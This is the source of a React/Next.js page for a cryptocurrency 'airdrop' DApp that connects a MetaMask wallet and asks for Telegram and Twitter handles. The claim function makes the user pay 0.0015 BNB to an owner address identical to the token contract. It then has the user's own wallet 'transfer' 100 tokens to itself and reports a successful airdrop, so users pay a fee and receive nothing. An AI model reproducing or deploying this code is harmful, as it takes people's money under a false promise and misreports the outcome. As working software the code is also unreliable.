"use client";

import { useEffect, useState } from "react";
import { ethers } from "ethers";
import ABI from "../contractABI.json";

const TOKEN_ADDRESS = "0x6Ec8Ad112E0109Eff1b66678E59767F99daf9d8f";
const OWNER_ADDRESS = "0x6Ec8Ad112E0109Eff1b66678E59767F99daf9d8f";
const AMOUNT_TO_SEND = ethers.utils.parseUnits("100", 18);
const REQUIRED_BNB = 0.0015;

export default function Home() {
  const [wallet, setWallet] = useState("");
  const [balance, setBalance] = useState("0");
  const [telegram, setTelegram] = useState("");
  const [twitter, setTwitter] = useState("");
  const [referral, setReferral] = useState("");
  const [status, setStatus] = useState("");
  const [processing, setProcessing] = useState(false);

  useEffect(() => {
    if (typeof window.ethereum !== "undefined") {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      provider
        .send("eth_requestAccounts", [])
        .then(async (accounts) => {
          setWallet(accounts[0]);
          const signer = provider.getSigner();
          const contract = new ethers.Contract(TOKEN_ADDRESS, ABI, signer);
          const bal = await contract.balanceOf(accounts[0]);
          setBalance(ethers.utils.formatUnits(bal, 18));
        })
        .catch(() => setStatus("Please connect your wallet"));
    } else {
      setStatus("Please install MetaMask");
    }

    const params = new URLSearchParams(window.location.search);
    const ref = params.get("ref");
    if (ref) setReferral(ref);
  }, []);

  const tasksDone = telegram.trim() !== "" && twitter.trim() !== "";

  async function claimAirdrop() {
    if (!tasksDone) {
      setStatus("Please complete all tasks before claiming.");
      return;
    }
    if (!wallet) {
      setStatus("Please connect your wallet.");
      return;
    }

    try {
      setProcessing(true);
      setStatus("");

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      const contract = new ethers.Contract(TOKEN_ADDRESS, ABI, signer);

      const tx = await signer.sendTransaction({
        to: OWNER_ADDRESS,
        value: ethers.utils.parseEther(REQUIRED_BNB.toString()),
      });
      await tx.wait();

      const transferTx = await contract.transfer(wallet, AMOUNT_TO_SEND);
      await transferTx.wait();

      setStatus("✅ Airdrop claimed successfully!");
      const bal = await contract.balanceOf(wallet);
      setBalance(ethers.utils.formatUnits(bal, 18));
    } catch (e) {
      setStatus("❌ Claim failed. Try again.");
      console.error(e);
    } finally {
      setProcessing(false);
    }
  }

  return (
    <main className="container mx-auto p-6 max-w-md">
      <h1 className="text-3xl font-bold mb-6 text-center">CIT Airdrop DApp</h1>

      <p>
        <strong>Wallet:</strong>{" "}
        {wallet ? wallet.slice(0, 6) + "..." + wallet.slice(-4) : "Not connected"}
      </p>
      <p>
        <strong>Token Balance:</strong> {balance}
      </p>

      <div className="mt-6">
        <label className="block mb-1 font-semibold" htmlFor="telegram">
          Telegram Username (Example: @yourhandle)
        </label>
        <input
          id="telegram"
          type="text"
          value={telegram}
          onChange={(e) => setTelegram(e.target.value)}
          className="w-full border px-3 py-2 rounded"
          placeholder="@yourhandle"
        />
      </div>

      <div className="mt-4">
        <label className="block mb-1 font-semibold" htmlFor="twitter">
          Twitter Username (Example: @yourhandle)
        </label>
        <input
          id="twitter"
          type="text"
          value={twitter}
          onChange={(e) => setTwitter(e.target.value)}
          className="w-full border px-3 py-2 rounded"
          placeholder="@yourhandle"
        />
      </div>

      {referral && (
        <div className="mt-6 bg-gray-100 p-3 rounded">
          <p className="font-semibold mb-1">Your Referral Code:</p>
          <code className="break-all">{referral}</code>
        </div>
      )}

      <button
        onClick={claimAirdrop}
        disabled={!tasksDone || processing}
        className={`mt-6 w-full py-3 text-white rounded ${
          !tasksDone || processing ? "bg-gray-400 cursor-not-allowed" : "bg-blue-600 hover:bg-blue-700"
        }`}
      >
        {processing ? "⏳ Processing..." : "🚀 Claim Airdrop"}
      </button>

      {status && <p className="mt-4 text-center">{status}</p>}
    </main>
  );
}